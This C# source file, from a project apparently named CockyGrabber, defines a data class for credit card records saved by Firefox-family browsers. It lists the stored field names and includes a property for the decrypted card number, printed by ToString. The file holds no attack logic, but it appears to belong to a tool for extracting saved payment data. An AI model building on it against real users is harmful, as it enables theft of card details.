using CockyGrabber.Utility;
using System;

namespace CockyGrabber
{
    public static partial class Gecko
    {
        public class CreditCard
        {
            public enum CreditCardType
            {
                Visa,
                MasterCard,
                AmericanExpress,
                Discover,
                DinersClub,
                JCB,
                Mir,
                UnionPay,
                CarteBancaire,
                Unknown
            }
            public enum Header
            {
                cc_number,
                cc_exp_month,
                cc_exp_year,
                cc_name,
                cc_type,
                guid,
                version,
                timeCreated,
                timeLastModified,
                timeLastUsed,
                timesUsed,
                cc_given_name,
                cc_additional_name,
                cc_family_name,
                cc_exp,
                cc_number_encrypted,
            }

            /// <summary>
            /// The credit card number.
            /// </summary>
            public string CC_Number { get; set; }
            /// <summary>
            /// The expiration month of the credit card.
            /// </summary>
            public int CC_ExpirationMonth { get; set; }
            /// <summary>
            /// The expiration year of the credit card.
            /// </summary>
            public int CC_ExpirationYear { get; set; }
            /// <summary>
            /// The name on the credit card.
            /// </summary>
            public string CC_Name { get; set; }
            /// <summary>
            /// The type of the credit card. (Visa, MasterCard, etc.)
            /// </summary>
            public CreditCardType CC_Type { get; set; }
            /// <summary>
            /// The Globally Unique Identifier.
            /// </summary>
            public string Guid { get; set; }
            /// <summary>
            /// The version.
            /// </summary>
            public int Version { get; set; }
            /// <summary>
            /// The time the credit card was created.
            /// </summary>
            public DateTimeOffset TimeCreated { get; set; }
            /// <summary>
            /// The time the credit card was last modified.
            /// </summary>
            public DateTimeOffset TimeLastModified { get; set; }
            /// <summary>
            /// The time the credit card was last used.
            /// </summary>
            public DateTimeOffset TimeLastUsed { get; set; }
            /// <summary>
            /// The number of times the credit card was used.
            /// </summary>
            public int TimesUsed { get; set; }
            /// <summary>
            /// The first name on the credit card.
            /// </summary>
            public string CC_GivenName { get; set; }
            /// <summary>
            /// The additional name on the credit card.
            /// </summary>
            public string CC_AdditionalName { get; set; }
            /// <summary>
            /// The family name on the credit card.
            /// </summary>
            public string CC_FamilyName { get; set; }
            /// <summary>
            /// The expiration date of the credit card. (YYYY-MM)
            /// </summary>
            public string CC_Expiry { get; set; }
            /// <summary>
            /// The encrypted credit card number.
            /// </summary>
            public string CC_NumberEncrypted { get; set; }
            /// <summary>
            /// The decrypted credit card number.
            /// </summary>
            public long CC_NumberDecrypted { get; set; }
            

            

            public override string ToString() => $"CC_NumberDecrypted = '{CC_NumberDecrypted}' | CC_Expiry = '{CC_Expiry}' | CC_Name = '{CC_Name}' | CC_Type = '{CC_Type}'";
            public string ToJson() => Tools.BrowserInformationToJson(this);
        }
    }
}